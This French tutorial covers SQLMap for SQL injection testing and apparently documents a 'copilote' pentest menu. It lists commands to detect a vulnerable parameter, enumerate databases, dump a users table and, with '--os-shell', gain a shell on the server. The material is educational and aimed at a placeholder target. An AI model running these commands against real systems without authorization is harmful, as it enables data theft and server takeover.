# Tutoriel : SQLMap

SQLMap est l'outil de référence pour tout ce qui concerne l'injection SQL. C'est un programme open source qui automatise le processus de détection, d'exploitation des failles d'injection SQL et de prise de contrôle des serveurs de bases de données.

---

## Qu'est-ce qu'une Injection SQL ?

C'est une vulnérabilité qui permet à un attaquant d'interférer avec les requêtes qu'une application fait à sa base de données. Une exploitation réussie peut permettre de lire des données sensibles, de modifier des données, et parfois même d'exécuter des commandes sur le serveur.

SQLMap automatise ce processus, qui serait autrement long et fastidieux.

---

## Utilisation et Exemples

Tout commence par une URL avec des paramètres, typiquement une page qui semble charger du contenu depuis une base de données (ex: `products.php?id=5`).

### Étape 1 : Détection

```bash
# Teste si le paramètre 'id' dans l'URL est vulnérable
sqlmap -u "http://<IP_CIBLE>/vuln.php?id=1"
```

- `-u` : L'URL à tester. **Il est crucial de mettre l'URL entre guillemets** pour éviter les erreurs d'interprétation par le shell.
- `--batch` : SQLMap pose beaucoup de questions. `--batch` répond "oui" à tout, ce qui est pratique pour l'automatisation.

### Étape 2 : Énumération

Une fois la faille confirmée, on explore la base de données.

```bash
# Lister toutes les bases de données
sqlmap -u "..." --dbs

# Lister les tables d'une base de données spécifique
sqlmap -u "..." -D nom_de_la_db --tables

# Lister les colonnes d'une table spécifique
sqlmap -u "..." -D nom_de_la_db -T nom_de_la_table --columns
```

### Étape 3 : Extraction (Dump)

Maintenant, on récupère les données.

```bash
# Extraire le contenu d'une table
sqlmap -u "..." -D nom_de_la_db -T utilisateurs --dump
```

### Étape 4 : Gagner un Shell (avancé)

Si les conditions le permettent (droits de la base de données, configuration système), SQLMap peut tenter d'obtenir un shell sur le système d'exploitation.

```bash
sqlmap -u "..." --os-shell
```

---

### 💡 L'Aide du Copilote

Le menu `Web > SQL Injection Testing` simplifie grandement l'utilisation de SQLMap.

1.  **Guidage de l'URL :** Le script vous demande l'URL complète à tester et vous donne un exemple basé sur l'IP de la cible pour vous aider à formater la requête.
2.  **Menu d'Actions :** Au lieu de mémoriser les options (`--dbs`, `--dump`), le copilote vous propose un menu simple : "Détection simple", "Énumération des bases de données", "Dump complet".
3.  **Automatisation :** Le script choisit les bonnes options pour vous. Par exemple, pour "Dump complet", il utilise `--dump-all` et `--batch` pour automatiser entièrement le processus.
4.  **Organisation des Résultats :** SQLMap génère beaucoup de fichiers. Le copilote crée automatiquement un dossier de sortie unique et horodaté (`sqlmap_...`) pour chaque session, gardant votre projet propre et organisé.

**Avantage :** Le copilote transforme SQLMap, un outil puissant mais complexe, en un processus guidé en 3 étapes, tout en organisant proprement les résultats pour une analyse ultérieure.
